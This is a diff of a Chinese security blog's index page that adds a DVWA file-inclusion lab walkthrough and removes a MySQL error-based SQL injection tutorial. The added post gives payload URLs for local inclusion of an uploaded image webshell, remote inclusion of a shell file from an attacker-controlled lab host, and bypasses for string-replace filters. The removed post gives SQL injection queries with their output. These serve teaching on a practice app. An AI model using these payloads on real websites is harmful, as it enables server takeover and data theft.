@@ -252,6 +252,217 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/26/DVWAFileInclusion/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Lawliet">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/LuFei.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lawliet Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/12/26/DVWAFileInclusion/" itemprop="url">dvwa File Inclusion</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-26T14:46:15+08:00">
+                2017-12-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="dvwa文件包含漏洞"><a href="#dvwa文件包含漏洞" class="headerlink" title="dvwa文件包含漏洞"></a>dvwa文件包含漏洞</h1><h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><p><strong>程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这中文件调用的过程一般被称为文件包含。程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。文件包含漏洞分为本地文件包含和远程文件包含，当php开启了<code>allow_url_include</code>时，将允许远程文件包含，为了研究文件包含,我们将<code>allow_url_include</code>打开，文件包含漏洞可以用来遍历目录文件，结合文件上传漏洞可以getshell，或者直接利用远程文件包含同样可以getshell</strong></p>
+<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p><strong>一台win2003虚拟机，ip为192.168.50.128，用wamp集成环境将dvwa搭在8080端口，php.ini中<code>allow_url_include</code>为<code>On</code></strong><br><strong>一台win7,攻击者服务器，ip为192.168.50.155，用来远程文件包含</strong></p>
+<p><strong>之前我们在文件上传漏洞中上传了图片马，我们利用文件包含漏洞去包含图片马，同样可以直接包含php一句话木马文件getshell，由于文件包含的特性，不管文件后缀名是什么，只要当中有php代码，都会当做php执行</strong></p>
+<h3 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h3><p><strong>代码如下</strong></p>
+<pre><code>&lt;?php
+
+// The page we wish to display
+$file = $_GET[ &apos;page&apos; ];
+
+?&gt; 
+</code></pre><p><strong>可以看到没有任何过滤，我们可以直接利用本地文件包含包含之前的图片马</strong></p>
+<p><strong>payload</strong></p>
+<pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/fi/?page=../../hackable/uploads/heishacker.jpg
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171226/eE969i5jiA.PNG" alt="mark"><br><strong>同时可以远程文件包含，包含远程服务器上的shell.txt，里面写着一句话木马</strong></p>
+<p><strong>payload</strong></p>
+<pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/fi/?page=http://192.168.50.155/shell.txt
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171226/a8DA5LeKHj.PNG" alt="mark"><br><strong>这两种方式都可以getshell</strong></p>
+<h3 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h3><p><strong>代码如下</strong></p>
+<pre><code>&lt;?php
+
+// The page we wish to display
+$file = $_GET[ &apos;page&apos; ];
+
+// Input validation
+$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );
+$file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );
+
+?&gt; 
+</code></pre><p><strong>可以看出用str_replace将<code>../</code>,<code>http://</code>,<code>https://</code>都替换成了空，但是str_replace这种方法是极其不安全的，首先这个函数只会检查一次，其次代码没有判断大小写，下面是绕过的payload</strong></p>
+<p><strong>本地包含绕过</strong></p>
+<pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/fi/?page=..././..././hackable/uploads/heishacker.jpg
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171226/gbc08eh46D.PNG" alt="mark"><br><strong>远程包含绕过</strong></p>
+<pre><code>http://192.168.50.128:8080/DVWA-master/vulnerabilities/fi/?page=Http://192.168.50.155/shell.txt
+</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/171226/JD691hGGfj.PNG" alt="mark"><br>    <a href="http://192.168.50.128:8080/DVWA-master/vulnerabilities/fi/?page=hthttp://tp://192.168.50.155/shell.txt" target="_blank" rel="external">http://192.168.50.128:8080/DVWA-master/vulnerabilities/fi/?page=hthttp://tp://192.168.50.155/shell.txt</a><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171226/Gh0mkE7H9D.PNG" alt="mark"></p>
+<h3 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h3><p><strong>代码如下</strong></p>
+<pre><code>&lt;?php
+
+// The page we wish to display
+$file = $_GET[ &apos;page&apos; ];
+if(!function_exists(&apos;fnmatch&apos;)) {
+
+    function fnmatch($pattern, $string) {
+        return preg_match(&quot;#^&quot;.strtr(preg_quote($pattern, &apos;#&apos;), array(&apos;\*&apos; =&gt; &apos;.*&apos;, &apos;\?&apos; =&gt; &apos;.&apos;)).&quot;$#i&quot;, $string);
+    } // end
+
+} // end if
+// Input validation
+if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file !=     &quot;include.php&quot; ) {
+    // This isn&apos;t the page we want!
+    echo &quot;ERROR: File not found!&quot;;
+    exit;
+}
+
+?&gt;
+</code></pre><p><strong>可以看出采用了白名单过滤，要求page后必须是以file开头的额，远程文件包含是不能使用了，我们可以用file协议包含图片马，同时要猜路径名，在文件上传中已经提到过，不在重复，可以看出白名单远比黑名单安全的多</strong></p>
+<h3 id="impossible级别"><a href="#impossible级别" class="headerlink" title="impossible级别"></a>impossible级别</h3><p><strong>代码如下</strong></p>
+<pre><code>&lt;?php
+
+// The page we wish to display
+$file = $_GET[ &apos;page&apos; ];
+
+// Only allow include.php or file{1..3}.php
+if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) {
+    // This isn&apos;t the page we want!
+    echo &quot;ERROR: File not found!&quot;;
+    exit;
+}
+
+?&gt; 
+</code></pre><p><strong>可以看出完全使用了白名单过滤，只要求允许的文件出现在page后，这种方式是最安全的，有效的防止了文件包含</strong></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/25/DVWAFileUpload/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2714,294 +2925,6 @@ d067a0fa9dc61a6e7195ca99696b5a896.php
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/12/error-base/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Lawliet">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/LuFei.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Lawliet Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/11/12/error-base/" itemprop="url">mysql报错注入总结</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-12T16:43:59+08:00">
-                2017-11-12
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web安全/" itemprop="url" rel="index">
-                    <span itemprop="name">web安全</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="mysql报错注入总结"><a href="#mysql报错注入总结" class="headerlink" title="mysql报错注入总结"></a>mysql报错注入总结</h1><p><strong>最近又深刻的研究了一下mysql的报错注入,发现很多值得记录的东西,于是写了这篇博客做一个总结,目的是为了更深刻的理解报错注入</strong></p>
-<h3 id="报错注入原因及分类"><a href="#报错注入原因及分类" class="headerlink" title="报错注入原因及分类"></a>报错注入原因及分类</h3><p><strong>既然是研究报错注入,那我们先要弄明白为什么我们的注入语句会导致数据库报错,报错的原因我自己总结了一下,有以下几点</strong></p>
-<ul>
-<li><p><strong>重复数据报错,这里的重复主要有两个方面,其中之一是基于主键的唯一性:一个表主键必须是唯一的,如果一个表尝试生成两个相同的主键，就会爆出<code>Duplicate entry &#39;1&#39; for key &#39;group_key&#39;</code>的主键重复错误,于是根据这种报错就产生了<code>floor(rand(0)*2)</code>等注入手法,另外一个就是基于列名的唯一性,如果我们在一个表中构造了两个相同的列名,就会产生<code>Duplicate column name</code>的错误,报错方法通常有<code>NAME_CONST</code>,或者利用join和using关键字连接同一个表创建子查询进行报错,这个方法从lctf2017 pcat大佬的writeup中学到的,在我的另一篇文章中会提到</strong></p>
-</li>
-<li><p><strong>基于数据类型不一致而产生的报错:mysql的一些函数参数要求的是什么数据类型,如果数据类型不符合,自然就会报错,这种报错也是相对容易理解的,根据这种特性产生的报错注入有<code>updatexml</code>,<code>extractvalue</code>等注入手法</strong></p>
-</li>
-<li><p><strong>基于BIGINT溢出错误的SQL注入,根据超出最大整数溢出产生的错误,这类报错注入是在mysql5.5.5版本后才产生的,5.5.5版本前并不会因为整数溢出而报错,这种注入自己在phpstudy上试了试,mysql版本为5.5.53,虽然报错了但是并没有爆出信息,以后研究出来再补充</strong></p>
-</li>
-<li><p><strong>其他报错,企业级代码审计这本书上看到的,一些mysql空间函数<code>geometrycollection()</code>,<code>multipoint()</code>,<code>polygon()</code>,<code>multipolygon()</code>,<code>linestring()</code>,<code>multilinestring()</code>,通过这些报错会产生<code>Illegal non geometric</code>的错误,里面同时包含了我们构造查询语句的信息</strong></p>
-</li>
-</ul>
-<h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p><strong>接下来对上面列出的一些报错注入一个个进行分析</strong></p>
-<h3 id="基于主键值重复"><a href="#基于主键值重复" class="headerlink" title="基于主键值重复"></a>基于主键值重复</h3><p><strong><code>floor(rand(0)*2)</code>:我们在进行报错注入时用的相对较多的方法,网上给出的报错语句大部分是这样的</strong></p>
-<pre><code>id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);
-</code></pre><p><strong>看到这是不是有点云里雾里的感觉呢,没关系,我也因为这个语句纠结了一段时间,比如为什么要<code>floor(rand(0)*2)</code>,为什么要用到<code>information_schema.tables</code>这个表,接下来我们就把它彻底弄明白,先看rand()这个函数,这个函数都知道是产生随机数的,但是当rand(0)被计算多次时它所产生的值是有规律的,我们以information_schema.tables这个表进行示范,因为它里面的数据多,别的表也可以,只要数据量够多,这样可以使rand(0)计算多次,便于观察,为了更便于观察,我们取前30条记录,查询语句</strong></p>
-<pre><code>mysql&gt; select rand(0) from information_schema.tables limit 0,30;
-
-+---------------------+
-| rand(0)             |
-+---------------------+
-| 0.15522042769493574 |
-|   0.620881741513388 |
-|  0.6387474552157777 |
-| 0.33109208227236947 |
-|  0.7392180764481594 |
-|  0.7028141661573334 |
-|  0.2964166321758336 |
-|  0.3736406931408129 |
-|  0.9789535999102086 |
-|  0.7738459508622493 |
-|  0.9323689853142658 |
-|  0.3403071047182261 |
-|  0.9044285983819781 |
-|   0.501221708488857 |
-|  0.7928227780319962 |
-|  0.4604487954270549 |
-|  0.9237756737729308 |
-| 0.23753201331713425 |
-|  0.4163330760005238 |
-|  0.3690693707848614 |
-|  0.5963476566563805 |
-|   0.874530201660963 |
-|  0.5836080690693185 |
-| 0.29444977109734877 |
-|  0.7214246790124333 |
-|  0.7237741125037652 |
-|  0.4545965562151713 |
-| 0.10166047429820567 |
-| 0.14451273357915947 |
-|  0.4175822757348253 |
-+---------------------+
-30 rows in set (0.05 sec)
-</code></pre><p><strong>通过多次测试观察可以发现规律,每次执行sql语句多次计算rand(0)时,rand(0)产生的值是总是固定的,不管执行多少次语句,多次计算的rand(0)的前30条总是和上面得计算结果一样,那么可以做出结论之后的结果也总是一样,观察上述计算结果,看似杂乱的数值其实都有着一个范围界限,那就是0~0.5,0.5~1,我们将<code>rand(0)*2</code>再观察一下</strong></p>
-<pre><code>mysql&gt; select rand(0)*2 from information_schema.columns limit 0,30;
-
-+---------------------+
-| rand(0)*2           |
-+---------------------+
-|  0.3104408553898715 |
-|   1.241763483026776 |
-|  1.2774949104315554 |
-|  0.6621841645447389 |
-|  1.4784361528963188 |
-|  1.4056283323146668 |
-|  0.5928332643516672 |
-|  0.7472813862816258 |
-|  1.9579071998204172 |
-|  1.5476919017244986 |
-|  1.8647379706285316 |
-|  0.6806142094364522 |
-|  1.8088571967639562 |
-|   1.002443416977714 |
-|  1.5856455560639924 |
-|  0.9208975908541098 |
-|  1.8475513475458616 |
-|  0.4750640266342685 |
-|  0.8326661520010477 |
-|  0.7381387415697228 |
-|   1.192695313312761 |
-|   1.749060403321926 |
-|   1.167216138138637 |
-|  0.5888995421946975 |
-|  1.4428493580248667 |
-|  1.4475482250075304 |
-|  0.9091931124303426 |
-| 0.20332094859641134 |
-| 0.28902546715831895 |
-|  0.8351645514696506 |
-+---------------------+
-30 rows in set (0.69 sec)
-</code></pre><p><strong>此时界限分隔值变成了1,数值都是零点几的小数和一点几的小数,于是用floor处理一下</strong></p>
-<pre><code>mysql&gt; select floor(rand(0)*2) from information_schema.columns limit 0,30;
-
-+------------------+
-| floor(rand(0)*2) |
-+------------------+
-|                0 |
-|                1 |
-|                1 |
-|                0 |
-|                1 |
-|                1 |
-|                0 |
-|                0 |
-|                1 |
-|                1 |
-|                1 |
-|                0 |
-|                1 |
-|                1 |
-|                1 |
-|                0 |
-|                1 |
-|                0 |
-|                0 |
-|                0 |
-|                1 |
-|                1 |
-|                1 |
-|                0 |
-|                1 |
-|                1 |
-|                0 |
-|                0 |
-|                0 |
-|                0 |
-+------------------+
-</code></pre><p><strong>于是就有了<code>floor(rand(0)*2)</code>,同样的,每次执行多次<code>floor(rand(0)*2)</code>,所得的结果也总是这样固定,我们只看前6个数字,总是0,1,1,0,1,1这样的顺序,后面的数也是如此有着自己的顺序</strong></p>
-<p><strong>接下来我们构造一个sql语句,它可以报出<code>Duplicate</code>的错误</strong></p>
-<pre><code>mysql&gt; select count(*) from information_schema.tables group by floor(rand(0)*2);
-
-ERROR 1062 (23000): Duplicate entry &apos;1&apos; for key &apos;group_key&apos;
-</code></pre><p><strong>分析这条语句,当进行<code>count(*)</code>,<code>group by</code>聚合函数分组计算时,mysql会创建一个虚拟表,虚拟表由主键列和<code>count(*)</code>列两列组成,同时<code>floor(rand(0)*2)</code>这个值会被计算多次,这一点很重要,计算多次是指在取数据表数据使用group by时,进行一次<code>floor(rand(0)*2)</code>,如果虚拟表中不存在此数据时,那么在往虚拟表插入数据时,<code>floor(rand(0)*2)</code>将会再被计算一次,接下来分析,取数据表第一条记录时第一次使用group by,计算<code>floor(rand(0)*2)</code>的值为0,查询虚拟表发现0这个主键不存在,于是再次计算<code>floor(rand(0)*2)</code>结果为1,将1作为主键插入虚拟表,这时主键1的<code>count(*)</code>值为1,接下来取数据表第二条记录时第二次使用group by,计算<code>floor(rand(0)*2)</code>,结果为1,然后查询虚拟表,发现1的键值存在,于是<code>count(*)</code>的值加1,取数据表第三条记录时第三次使用group by,计算<code>floor(rand(0)*2)</code>值为0,查询虚拟表,发现0的键值不存在,于是再一次计算<code>floor(rand(0)*2)</code>,结果为1,当尝试将1插入虚拟表中时,发现主键1已经存在,所以报出主键重复的错误,整个过程中查询了information_schema.tables这个表3条记录发生报错,这也是报错为什么需要数据表的记录多到至少为3条的原因,也是为什么选择information_schema.tables表的原因,因为这个表中的记录一定大于三条,由此可知我们其实还以选择<code>information_schema.columns</code>,<code>information_schema.schemata</code>等表</strong></p>
-<p><strong>下面构造语句</strong></p>
-<pre><code>mysql&gt; select count(*) from information_schema.tables group by concat(floor(rand(0)*2),0x3a,user());
-ERROR 1062 (23000): Duplicate entry &apos;1:root@localhost&apos; for key &apos;group_key&apos;
-</code></pre><p><strong>是不是看着很眼熟,没错，这就是我们在开头给出的那个复杂的语句,只不过开头的那个加了个子查询,其实and后的括号里直接写这个语句也能达到一样的效果</strong></p>
-<pre><code>mysql&gt; select * from user where id=1 and (select count(*) from information_schema.tables group by concat(floor(rand(0)*2),0x3a,user()));
-ERROR 1062 (23000): Duplicate entry &apos;1:root@localhost&apos; for key &apos;group_key&apos;
-</code></pre><p><strong>把user()换成其他查询语句,就可以注入出别的数据</strong></p>
-<h3 id="基于数据类型的不一致"><a href="#基于数据类型的不一致" class="headerlink" title="基于数据类型的不一致"></a>基于数据类型的不一致</h3><p><strong>updatexml(1,XPATH,1)函数的第二个参数要求为XPATH格式,如果我们把它改为字符串格式,那么就会爆出<code>XPATH syntax error</code>的错误,于是构造sql语句</strong></p>
-<pre><code>mysql&gt; select * from user where id=1 and updatexml(1,(concat(1,user())),1);
-ERROR 1105 (HY000): XPATH syntax error: &apos;root@localhost&apos;
-</code></pre><p><strong>利用concat函数返回字符串产生报错,同样的函数还有extractvalue(1,XPATH)</strong></p>
-<pre><code>mysql&gt; select * from user where id=1 and extractvalue(1,(concat(1,user())));
-ERROR 1105 (HY000): XPATH syntax error: &apos;root@localhost&apos;
-</code></pre>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3056,7 +2979,7 @@ ERROR 1105 (HY000): XPATH syntax error: &apos;root@localhost&apos;
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">24</span>
+                  <span class="site-state-item-count">25</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3067,7 +2990,7 @@ ERROR 1105 (HY000): XPATH syntax error: &apos;root@localhost&apos;
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -3078,7 +3001,7 @@ ERROR 1105 (HY000): XPATH syntax error: &apos;root@localhost&apos;
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-count">12</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
